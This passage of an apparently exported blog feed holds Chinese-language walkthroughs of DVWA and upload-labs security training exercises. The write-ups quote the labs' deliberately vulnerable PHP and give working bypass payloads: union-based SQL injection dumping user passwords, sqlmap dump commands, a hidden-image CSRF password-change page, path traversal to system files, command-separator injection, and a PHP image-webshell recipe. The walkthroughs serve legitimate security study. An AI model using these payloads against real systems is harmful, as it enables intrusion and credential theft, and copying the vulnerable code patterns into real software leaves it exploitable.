); &#125; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到当SQL语句查询为空的时候，会随机执行sleep()函数，并随机延迟2~4秒，那么用时间盲注就可能被影响，因此这关用布尔盲注。具体同Low级别一样。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—SQL Injection","date":"2021-03-09T13:20:45.370Z","path":"2021/03/09/DVWA—SQL Injection/","text":"前言：之前有刷过sqlilabs，前言就不再介绍了。 Low：手工注入：1）判断是否存在注入点，注入点是字符型还是数字型 1’ and ‘1’=’1，成功 1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为&#39; 2）猜解SQL查询语句中的字段数 1’ order by 1#不报错； 1’ order by 2#不报错； 1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。 3）判断回显位 0’ union select 1,2#![1](DVWA—SQL Injection/1.png) 有两个回显位。 4）爆库 0’ union select 1,database()#![2](DVWA—SQL Injection/2.png) 5）爆表 0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png) 6）爆列 0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’# ![4](DVWA—SQL Injection/4.png) 7）爆值 0’ union select user,password from users# ![5](DVWA—SQL Injection/5.png) 或0’ union select 1,group_concat(user,0x3a,password) from users# ![6](DVWA—SQL Injection/6.png) 利用sqlmap自动注入：1）获取所有数据库 sqlmap.py -u “url” –cookie “cookie中的内容” –dbs sp： -u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 ​ –dbs：获取所有数据库 2）查询当前数据库名 sqlmap.py -u “url” –cookie “cookie中的内容” –current-db sp： –current-db：查询当前数据库昵称 3）查表名 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables sp：-D：指定数据库 –table：查询所有表 ​ –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行) 4）查列名 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns sp：-T：指定表名 ​ –columns：查询所有列 5）查值 sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump sp：-C：指定columns 如果不指定,默认整表 查看源码： 1234567891011121314151617&lt;?php if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; Medium：查看源码： 12345678910111213141516171819202122232425262728293031323334&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; //Get input* $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; //Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; 我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png) High：查看源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; 我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面 ![8](DVWA—SQL Injection/8.png) 但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 Impossible：查看源码： 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; https://www.cnblogs.com/leezhxing/p/5282437.html","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—Cross Site Request Forgery (CSRF)","date":"2021-03-04T10:16:08.000Z","path":"2021/03/04/DVWA—CSRF/","text":"前言： CSRF，全称Cross-site request forgery，译为跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。需要注意的是，受害者需要使用含有效cookie的浏览器访问攻击者的页面时才会触发csrf攻击。 Low:查看源码： 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到服务器没有任何的防CSRF机制。那么我们可以构造404网页进行访问欺骗，编写test.html，内容为： 123&lt;img src=&quot;http://localhost:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt; 当受害者点击test.html时，就相当于攻击者利用受害者的cookie（即利用受害者的身份）进行了修改受害者账户密码这样一个操作。服务器那边会误以为是受害者自己下达的改密码的指令，而受害者会以为自己点到了一个失效的url，页面返回404,，但是其实这时受害者的密码已经被悄悄更改。可想而知CSRF的危害性多么大。 Medium：查看源码： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 我们可以看到服务器检查变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数的值），以抵御CSRF攻击。 我们先在原页面上提交修改密码请求，burp抓包： 再模拟CSRF攻击，burp抓包： 我们可以看到如果按照low级别的CSRF攻击是肯定不可能攻击成功的，因为它缺少了Referer的值。因此我们需要手动添加 Referer: localhost:81 High:查看源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—File Inclusion","date":"2021-02-28T11:26:47.000Z","path":"2021/02/28/DVWA—File Inclusion/","text":"前言：File Inclusion，译为文件包含（漏洞）。服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件。此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。 文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。 本地文件包含漏洞：通过浏览器包含web服务器上的文件，这种漏洞是因为服务器包含文件时没有进行严格的过滤，直接允许并执行用户在url输入的服务器包含文件。通俗的说就是被包含的文件在服务器本地。 远程文件包含漏洞：服务器开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。在远程服务器上预先设置好的webshell，然后攻击者利用该漏洞包含一个远程的文件。这种漏洞的出现是因为服务器对用户的输入没有进行检查，会导致不同程度的信息泄露。通俗的说就是被包含的文件不在目标服务器。 常见的敏感信息路径 利用本地文件包含漏洞可以获取系统（服务器）的本地文件的内容。Windows系统常见敏感文件如下： c:\\boot.ini 系统版本信息c:\\xxx\\php.ini PHP配置信息。c:\\xxx\\my.ini MySQL配置信息。c: \\xxx\\httpd.conf Apache配置信息。linux系统常见敏感文件如下： /etc/passwd Linux系统账号信息。/etc/httpd/conf/httpd.conf Apache配置信息。/etc/my.conf MySQL配置信息。/usr/etc/php.ini PHP配置信息。 常见路径符号 / 根目录./ 当前目录../ 返回到上一级目录../../ 返回上两级目录.\\ 、..\\和./、../ 意义相同 Low：查看源码： 123456&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; 我们可以看到，服务器端对page参数没有做任何的过滤跟检查。 利用本地文件包含漏洞 我们先让参数page的值等于一个服务器本地不存在的文件![1](DVWA—File Inclusion/1.png) 我们可以看到网站的根目录为\\DVWA-master\\，而index.php文件距根目录差两个文件夹，那么我们可以通过两个../回到根目录，然后去访问一些敏感文件：如PHP版本信息等。![2](DVWA—File Inclusion/2.png) 利用远程文件包含漏洞 因为我们搭的是靶场模拟服务器，那dvwa（81端口）靶场就相当于一个服务器，我们再在“远端服务器”127.0.0.1下上传文件1.txt内容为： 123&lt;?php phpinfo();?&gt; 然后利用远程文件包含访问![3](DVWA—File Inclusion/3.png) Medium：查看源码： 12345678910&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; 我们可以看到服务器过滤了http://, https://，../, ..\\，但是我们只要用双写就可以绕过了 ![4](DVWA—File Inclusion/4.png) ![5](DVWA—File Inclusion/5.png) High：查看源码： 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; 新函数： fnmatch() 函数 功能：根据指定的模式来匹配文件名或字符串。 语法：fnmatch(pattern,string,flags) 参数 描述 pattern 必需。规定要检索的模式。 string 必需。规定要检查的字符串或文件。 flags 可选。 我们可以看到服务器规定只能包含以file开头的文件，但是我们可以利用file协议绕过。 file协议主要用于访问本地计算机中的文件，当我们用浏览器打开一个本地文件时利用的就是file协议![6](DVWA—File Inclusion/6.png) file协议的基本格式：file:///文件路径 由于file协议规定只能由于访问本地文件，因此搭配文件上传漏洞效果极佳。![7](DVWA—File Inclusion/7.png) Impossible：查看源码： 1234567891011121314Impossible File Inclusion Source&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA——Command Injection","date":"2021-02-25T12:24:15.000Z","path":"2021/02/25/DVWA—Command Injection/","text":"前言：命令注入——利用可以调用系统命令的web应用，通过构造特殊命令字符串的方式，把恶意代码输入一个编辑域(例如缺乏有效验证的输入框)来改变网页动态生成的内容，最终实现本应在服务端才能工作的系统命令。命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。 &amp;，&amp;&amp;，|，||命令拼接符的区别: A&amp;B 拼接，A和B之间无制约关系 A&amp;&amp;B A执行成功，之后才会执行B A|B A的输出作为B的输入 A||B A执行失败，之后才会执行B A;B ; 分号表示命令依次执行。 windows系统下常见的拼接命令： ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 Linux命令大全：https://www.runoob.com/linux/linux-command-manual.html Low:查看源码： 1234567891011121314151617&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 新函数： php_uname()函数 功能：返回运行 PHP 的系统的有关信息。 语法：php_uname ([ string $mode = “a” ] ) 其中，mode 是单个字符，用于定义要返回什么信息： &#39;a&#39;：此为默认。包含序列 &quot;s n r v m&quot; 里的所有模式。 &#39;s&#39;：操作系统名称。例如： FreeBSD。 &#39;n&#39;：主机名。例如： localhost.example.com。 &#39;r&#39;：版本名称，例如： 5.1.2-RELEASE。 &#39;v&#39;：版本信息。操作系统之间有很大的不同。 &#39;m&#39;：机器类型。例如：i386。 shell_exec()函数 功能：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。（补充：Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。） 语法：shell_exec ( string $cmd ) 其中参数cmd为要执行的命令。 查看源码我们可知，服务器通过stristr和php_uname两个函数来判断操作系统，执行不同的ping命令。同时服务器没有对我们输入的IP地址做任何的过滤处理，我们可以利用任意的命令执行分隔符来执行我们的指令、获取我们想要的信息。 例如输入：127.0.0.1&amp;&amp;echo “hello world” ![1](DVWA—Command Injection/1.png) Medium:查看源码： 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 新函数： str_replace()函数 功能：替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是一个数组，那么它将返回一个数组。 如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。 如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。 如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 补充：该函数是区分大小写的。 str_ireplace() 函数执行不区分大小写的搜索。 语法：str_ireplace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 array_keys() 函数 功能：返回包含数组中所有键名的一个新数组。 语法：array_keys(array,value,strict) 参数 描述 array 必需。规定数组。 value 可选。您可以指定键值，然后只有该键值对应的键名会被返回。 strict 可选。与 value 参数一起使用。 可能的值：true - 返回带有指定键值的键名。依赖类型，数字 5 与字符串 “5” 是不同的； false - 默认值。不依赖类型，数字 5 与字符串 “5” 是相同的。 ​ 菜鸟实例： 12345&lt;?php$a&#x3D;array(&quot;Volvo&quot;&#x3D;&gt;&quot;XC90&quot;,&quot;BMW&quot;&#x3D;&gt;&quot;X5&quot;,&quot;Toyota&quot;&#x3D;&gt;&quot;Highlander&quot;);print_r(array_keys($a));?&gt;运行结果：Array ( [0] &#x3D;&gt; Volvo，[1] &#x3D;&gt; BMW ，[2] &#x3D;&gt; Toyota ) 通过查看源码我们发现服务器设置了黑名单过滤了字符&amp;&amp;和;，但是我们可以是用&amp;替代，&amp;;&amp;绕过的方式避开黑名单。 High：查看源码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 通过查看源码我们看到服务器对黑名单进行了补充，但是发现黑名单禁用的是&#39;| &#39;(这个里面有个空格)，而不是&#39;|&#39;，那么也就是说|命令指令符未被禁用。 Impossible：查看源码： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass14-21","date":"2021-02-20T04:27:30.000Z","path":"2021/02/20/upload-labs-pass14-21/","text":"[TOC] 前言从pass-14开始都是图片马搭配文件包含漏洞。 图片马的制作 使用cmd制作图片马：copy 1.jpg/b+1.php 2.jpg——意思是将1.jpg以二进制方式与1.php合并成2.jpg，这个2.jpg就是图片马了。 文件包含漏洞 -》文件包含简介：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当作PHP来执行。 -》文件包含函数：PHP中文件包含函数有以下四种： 1.require()；2.require_once()；3.include()；4.include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 -》文件包含漏洞原理：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 示例代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 12345678910111213141516171819202122232425262728293031参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395# pass-14：文件头检查绕过* 查看源码，发现服务器只检查文件内容的前两个字节补充：一般文件内容的前两个字节会体现出自己是什么类型的文件（可以用winhex查看）。因此本pass直接上传图片马即可绕过了。* 图片马的利用： 一般图片马是无法直接连接蚁剑的，那么我们可以搭配文件包含漏洞来操作服务器。点开pass-14注意2的文件包含漏洞网页，url栏输入：?file&#x3D;.&#x2F;upload&#x2F;文件名![2](upload-labs-pass14&#x2F;2.png)# pass-15：突破getimagesize()查看源码：&#96;&#96;&#96;phpif(file_exists($filename))&#123; $info &#x3D; getimagesize($filename); $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;根据索引2的值转换为对应后缀 if(stripos($types,$ext)&gt;&#x3D;0)&#123; return $ext; 